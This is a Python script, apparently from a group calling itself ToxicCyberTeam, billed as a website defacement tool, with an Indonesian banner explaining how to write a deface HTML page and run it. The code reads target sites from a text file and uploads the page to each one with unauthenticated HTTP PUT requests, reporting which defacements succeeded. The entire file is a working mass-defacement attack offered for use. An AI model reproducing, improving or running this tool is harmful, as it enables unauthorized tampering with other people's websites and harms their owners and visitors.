#-*- coding: utf-8 -*-

try:
   import requests
   import os.path
   import sys
except ImportError:
   exit("install requests and try again ...")

banner = """

        <====================================>
                  TCT DEFACE TOOLS
	     <=============\033[97m=============>
                     Mr k3mpl03 :)    
        <====================================>


    • Github   : https://github.com/ToxicCyberTeam
    • WhatsApp : +92 313-1694897 / +62 857-2620-1352
    • Facebook : https://m.facebook.com/Makky
    • YouTube  : http://youtube.com/c/Makky2693

Bahan	   : • Kode html script deface kalian
Cara Pakai : • Buka New Session ( Tab Baru )
	     $ cd Deface
	     $ nano terserah.html (bisa di ganti_-)
	     • Pastekan kode script deface kalian
	     • ctrl + x 
	     • klik "y" lalu enter
	     $ python2 Deface.py

*) Di suruh masukan nama script yg tadi
    Masukin nama yg kalian pilih (terserah.html) 
"""

b = '\033[31m'
h = '\033[32m'
m = '\033[00m'

def x(tetew):
   ipt = ''
   if sys.version_info.major > 2:
      ipt = input(tetew)
   else:
      ipt = raw_input(tetew)
   
   return str(ipt)

def aox(script,target_file="target.txt"):
   op = open(script,"r").read()
   with open(target_file, "r") as target:
      target = target.readlines()
      s = requests.Session()
      print("uploading file to %d website"%(len(target)))
      for web in target:
         try:
            site = web.strip()
            if site.startswith("http://") is False:
               site = "http://" + site
            req = s.put(site+"/"+script,data=op)
            if req.status_code < 200 or req.status_code >= 250:
               print(m+"["+b+" GAGAL GOBLOG!"+m+" ] %s/%s"%(site,script))
            else:
               print(m+"["+h+" TERDEPES"+m+" ] %s/%s"%(site,script))

         except requests.exceptions.RequestException:
            continue
         except KeyboardInterrupt:
            print; exit()

def main(__bn__):
   print(__bn__)
   while True:
      try:
         a = x("~~ MrK3mpl03 | MrFath | Carlos | ArRose | Seven | GOTAKX ~~")
         if not os.path.isfile(a):
            print("file '%s' not found"%(a))
            continue
         else:
            break
      except KeyboardInterrupt:
         print; exit()

   aox(a)

if __name__ == "__main__":
    main(banner)
